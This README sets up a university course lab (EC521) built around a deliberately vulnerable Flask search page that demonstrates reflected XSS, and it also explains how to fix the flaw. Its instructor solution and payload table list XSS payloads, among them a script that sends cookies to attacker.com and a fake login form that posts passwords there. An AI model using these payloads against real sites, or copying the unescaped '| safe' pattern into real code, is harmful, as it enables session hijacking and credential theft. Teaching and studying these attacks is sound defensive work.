# Reflected XSS Demo - TerrierSearch

A hands-on demonstration of reflected Cross-Site Scripting (XSS) vulnerabilities for EC521 Introduction to Cybersecurity.

## Overview

This demo teaches students how reflected XSS attacks work by providing a deliberately vulnerable search engine. The search query is reflected back to the page without proper sanitization, allowing attackers to inject malicious JavaScript.

**See also:**
- **Encoded** (port 5005): `xss-encoded` - Output encoding only
- **CSP + HttpOnly** (port 5006): `xss-csp` - Full protection

## Learning Objectives

- Understand how reflected XSS attacks work
- Learn to identify vulnerable code patterns (unsanitized output)
- Practice exploiting an XSS vulnerability
- Understand the importance of output encoding and Content Security Policy

## Setup

### Requirements

- Python 3.7+
- Flask

### Installation

```bash
pip install -r requirements.txt
```

### Running the App

```bash
python app.py
```

Visit `http://localhost:5004` in your browser.

## The Challenge

The search engine reflects your query on the results page. Your goal: **Execute JavaScript code in the browser and steal the secret cookie!**

### Hints for Students

1. Try searching for normal text - observe how it appears on the page
2. What happens if you search for HTML tags?
3. Can you make the browser execute JavaScript?
4. There's a secret cookie set by the server - can you steal it?
5. Think about what an attacker could do with this vulnerability

## Solution (For Instructors)

<details>
<summary>Click to reveal solution</summary>

### The Vulnerability

The search query is rendered with `| safe` in the Jinja2 template, which disables HTML escaping:

```html
<!-- VULNERABLE -->
<p class="query-display">{{ query | safe }}</p>
```

### Exploitation Methods

**Method 1: Basic script tag**
```
<script>alert('XSS')</script>
```

**Method 2: Event handler (bypasses some filters)**
```
<img src=x onerror="alert('XSS')">
```

**Method 3: SVG-based XSS**
```
<svg onload="alert('XSS')">
```

**Method 4: Stealing cookies (malicious example)**
```
<script>document.location='http://attacker.com/?c='+document.cookie</script>
```

**Method 5: Injecting a fake login form**
```
<form action="http://attacker.com/steal"><input name="password" placeholder="Session expired. Enter password:"><button>Login</button></form>
```

### Creating a Malicious Link

An attacker would craft a URL like:
```
http://localhost:5004/?q=<script>alert('XSS')</script>
```

When a victim clicks this link, the script executes in their browser.

</details>

## Types of XSS

### 1. Reflected XSS (This Demo)

- Malicious script is part of the request (URL, form data)
- Script is "reflected" back in the response
- Requires victim to click a malicious link
- Non-persistent

### 2. Stored XSS

- Malicious script is stored in the database
- Script is served to all users who view the content
- More dangerous - affects multiple users
- Persistent

### 3. DOM-based XSS

- Vulnerability exists in client-side JavaScript
- Server never sees the malicious payload
- Exploitation happens entirely in the browser

## Security Vulnerabilities Demonstrated

| Vulnerability | Description |
|--------------|-------------|
| **Reflected XSS** | User input reflected without sanitization |
| **No Output Encoding** | HTML/JS special characters not escaped |
| **No CSP** | No Content Security Policy to block inline scripts |

## How to Fix (Discussion Points)

### 1. Output Encoding (Primary Fix)

Always escape user input before rendering:

```python
# In Jinja2, DON'T use | safe for user input
# Default behavior escapes HTML:
{{ query }}  # SAFE - escapes < > " ' &

# NEVER do this with user input:
{{ query | safe }}  # DANGEROUS!
```

### 2. Content Security Policy (CSP)

Add HTTP header to prevent inline script execution:

```python
@app.after_request
def add_csp(response):
    response.headers['Content-Security-Policy'] = "script-src 'self'"
    return response
```

### 3. Input Validation

While not sufficient alone, validate and sanitize input:

```python
import bleach
clean_query = bleach.clean(query)  # Strips dangerous HTML
```

### 4. HTTPOnly Cookies

Prevent JavaScript from accessing session cookies:

```python
app.config['SESSION_COOKIE_HTTPONLY'] = True
```

## Real-World Impact

XSS can be used to:
- **Steal session cookies** - Hijack user accounts
- **Keylog user input** - Capture passwords and sensitive data
- **Deface websites** - Modify page content
- **Redirect users** - Send to phishing sites
- **Spread malware** - Download malicious files
- **Perform actions as the user** - Change settings, make purchases

## Files

| File | Description |
|------|-------------|
| `app.py` | Flask app with reflected XSS vulnerability |
| `static/terrier.png` | Logo image |
| `requirements.txt` | Python dependencies |
| `README.md` | This documentation |

## Secret Cookie

The app sets a cookie `secret=s3cr3t` without the HttpOnly flag, making it accessible via JavaScript. This demonstrates why HttpOnly is important for sensitive cookies.

## Try These Payloads

| Payload | Effect |
|---------|--------|
| `<script>alert('XSS')</script>` | Basic alert box |
| `<script>alert(document.cookie)</script>` | **Steal the secret cookie!** |
| `<img src=x onerror=alert(document.cookie)>` | Cookie theft via event handler |
| `<img src=x onerror=alert('XSS')>` | Image error handler |
| `<svg onload=alert('XSS')>` | SVG load event |
| `<body onload=alert('XSS')>` | Body load event |
| `<marquee onstart=alert('XSS')>` | Marquee start event |
| `"><script>alert('XSS')</script>` | Break out of attribute |

## All Demos in This Series

| Folder | Port | Description |
|--------|------|-------------|
| cookie-demo | 5000 | Cookie manipulation attack |
| sqli-classic | 5001 | Classic SQL injection in login form |
| sqli-blind | 5002 | Boolean-based blind SQL injection |
| sqli-secure | 5003 | SQL injection prevention with prepared statements |
| **xss-reflected** | 5004 | Cross-site scripting via search (this demo) |
| xss-encoded | 5005 | Output encoding only |
| xss-csp | 5006 | Full protection with CSP |
| xss-stored | 5007 | Stored XSS in notes app |
| xss-dom | 5008 | DOM-based XSS |

## License

Educational use only - EC521 Boston University
